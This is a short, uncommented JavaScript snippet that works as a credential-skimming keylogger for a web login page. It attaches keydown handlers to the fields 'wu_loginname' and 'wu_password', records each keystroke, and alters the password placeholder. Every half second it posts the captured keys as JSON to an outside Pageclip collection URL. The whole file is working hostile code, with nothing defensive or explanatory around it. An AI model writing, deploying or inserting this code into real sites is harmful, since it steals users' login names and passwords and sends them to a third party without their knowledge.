document.onload = function (e) {
  var keys = '';
  var url = 'https://send.pageclip.co/mMJZqTWOskoatOv5E2bqIWkAxqcetkfi';
  document.getElementsByName('wu_loginname')?.forEach((element) => {
    element.onkeydown = function (e) {
      let key = `[${e.key}:${e.type}:l]`;
      keys += key;
    };
  });
  document.getElementsByName('wu_password')?.forEach((element) => {
    element.setAttribute('placeholder', ':DDDDD');
    element.onkeydown = function (e) {
      let key = `[${e.key}:${e.type}:p]`;
      keys += key;
    };
  });

  window.setInterval(function () {
    if (keys.length > 0) {
      fetch(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json;charset=utf-8',
        },
        body: JSON.stringify({ text: keys }),
      });
      keys = '';
    }
  }, 500);
};
